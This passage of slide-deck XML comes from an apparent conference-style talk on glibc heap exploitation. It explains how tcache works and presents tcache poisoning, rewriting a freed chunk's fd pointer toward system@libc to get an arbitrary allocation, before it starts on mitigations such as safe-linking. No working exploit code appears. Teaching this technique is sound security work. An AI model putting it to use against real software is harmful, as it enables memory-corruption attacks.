        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2743200"/>
            <a:ext cx="111556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5200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="5200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The Suspects</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="5200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Google Shape;81;p6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="388620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400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>The mitigations — lined up.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Google Shape;82;p6"/>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b="0" i="0" lang="en-US" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>06 / 27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87" name="Shape 87"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="Google Shape;88;p7"/>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b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CASE №2039 — ACT II · THE ALLOCATOR</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Google Shape;89;p7"/>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b="0" i="0" lang="en-US" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>07 / 27</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Google Shape;90;p7"/>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i="0" lang="en-US" sz="3400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>tcache, in one picture</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="Google Shape;91;p7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1371600"/>
            <a:ext cx="111556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b="0" i="0" lang="en-US" sz="1700" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Per-thread, single-linked, LIFO. Fast path for small frees — and the attacker's favorite.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Google Shape;92;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2103120"/>
            <a:ext cx="2926080" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5000"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="2240280"/>
            <a:ext cx="27432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E8EB"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>tcache_perthread_struct</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6E8EB"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>(per thread, on the heap)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="94" name="Google Shape;94;p7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="2560320"/>
            <a:ext cx="640080" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="25400">
            <a:solidFill>
              <a:srgbClr val="E3B341"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Google Shape;95;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="2103120"/>
            <a:ext cx="1920240" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 50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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4206240" y="224028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chunk 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fd →</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="97" name="Google Shape;97;p7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="2560320"/>
            <a:ext cx="548640" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="25400">
            <a:solidFill>
              <a:srgbClr val="3FB950"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="Google Shape;98;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2103120"/>
            <a:ext cx="1920240" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 50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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6675120" y="224028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chunk B</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fd →</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="100" name="Google Shape;100;p7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8503920" y="2560320"/>
            <a:ext cx="548640" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="25400">
            <a:solidFill>
              <a:srgbClr val="3FB950"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Google Shape;101;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9052560" y="2103120"/>
            <a:ext cx="1920240" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 50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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="2240280"/>
            <a:ext cx="17373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chunk C</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fd →</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Google Shape;103;p7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3566160"/>
            <a:ext cx="530352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600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>free() pushes a chunk onto its size-class bin; malloc() of that size pops it back.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1100"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Each entry's fd points to the next free chunk — control fd and malloc hands you an arbitrary pointer.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1100"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>That primitive — tcache poisoning — is our way in. Everything else is getting past the guards.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="Google Shape;104;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="3383280"/>
            <a:ext cx="4846320" cy="246888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91425" lIns="182875" spcFirstLastPara="1" rIns="182875" wrap="square" tIns="137150">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>BEFORE</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>  fd  →  0x0000555500401330</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="900">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>         (next free chunk in tcache)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="0" sz="900">
              <a:solidFill>
                <a:srgbClr val="8B929B"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:ea typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
              <a:sym typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>AFTER  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>tcache poison</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>  fd  →  0x00007f93d7656560</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="900">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>         (→ system@libc)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="0" sz="900">
              <a:solidFill>
                <a:srgbClr val="E5484D"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:ea typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
              <a:sym typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>one pointer rewrite → arbitrary allocation</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Google Shape;105;p7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9635270" y="5888728"/>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110" name="Shape 110"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="Google Shape;111;p8"/>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 · THE LINEUP</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Google Shape;112;p8"/>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08 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Google Shape;113;p8"/>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Four walls — with birthdays from the source</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Google Shape;114;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1600200"/>
            <a:ext cx="5440680" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2439"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="178308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2100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2100">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>safe-linking</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Google Shape;116;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4069080" y="1819656"/>
            <a:ext cx="1691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B341"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>glibc 2.32</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="117" name="Google Shape;117;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
